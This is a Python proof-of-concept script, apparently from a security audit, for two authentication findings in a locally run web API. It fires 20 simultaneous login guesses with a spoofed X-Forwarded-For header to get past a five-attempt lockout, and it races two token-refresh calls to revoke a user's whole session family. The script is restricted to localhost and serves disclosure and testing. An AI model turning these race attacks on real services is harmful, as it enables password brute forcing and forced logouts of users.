"""PoC FIND-2026-004 (lockout race) and FIND-2026-005 (concurrent refresh kills the session).

Local instance only; relaxed rate limits (see README) so only the lockout logic is measured.
"""

import collections
import concurrent.futures as cf
import sqlite3
import sys

import httpx

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18703"
DB = sys.argv[2] if len(sys.argv) > 2 else None  # optional: scratch DB path to reset login_attempts
assert BASE.startswith("http://127.0.0.1:"), "local instances only"


def new_client(xff: str | None = None):
    c = httpx.Client(base_url=BASE, timeout=120)
    c.get("/api/v1/auth/csrf")
    h = {"Origin": BASE, "X-CSRF-Token": c.cookies.get("csrf_token")}
    if xff:
        h["X-Forwarded-For"] = xff
    return c, h


def guess(i: int) -> int:
    c, h = new_client("10.50.0.1")  # same address and same account for every request
    r = c.post("/api/v1/auth/login", json={"username": "victim", "password": f"wrong-guess-{i:04d}"}, headers=h)
    return r.status_code


if DB:
    con = sqlite3.connect(DB)
    con.execute("delete from login_attempts")
    con.commit()
    con.close()
with cf.ThreadPoolExecutor(20) as ex:
    codes = collections.Counter(ex.map(guess, range(20)))
print("20 simultaneous guesses, same IP+account (limit is 5):", dict(codes))  # expect 20x 401

# --- FIND-2026-005: two simultaneous refresh calls with the same cookie
c, h = new_client("10.60.0.1")
assert c.post("/api/v1/auth/login", json={"username": "user1", "password": "Us3r-Correct-Horse-42"}, headers=h).status_code == 200
rt = c.cookies.get("refresh_token", path="/api/v1/auth")
out = {}


def refresh(i: int) -> int:
    cc, hh = new_client("10.60.0.1")
    r = cc.post("/api/v1/auth/refresh", headers={**hh, "Cookie": f"{hh.get('Cookie','')}; refresh_token={rt}"})
    out[i] = (r.status_code, cc.cookies.get("access_token", path="/api"), cc.cookies.get("refresh_token", path="/api/v1/auth"))
    return r.status_code


with cf.ThreadPoolExecutor(2) as ex:
    print("two simultaneous refreshes:", list(ex.map(refresh, range(2))))  # observed: [204, 401]
win = next(v for v in out.values() if v[0] == 204)
cc, hh = new_client("10.60.0.1")
r = cc.get("/api/v1/auth/me", headers={"Cookie": f"access_token={win[1]}"})
print("winner's new access token works?", r.status_code)  # observed 401: the whole family was revoked
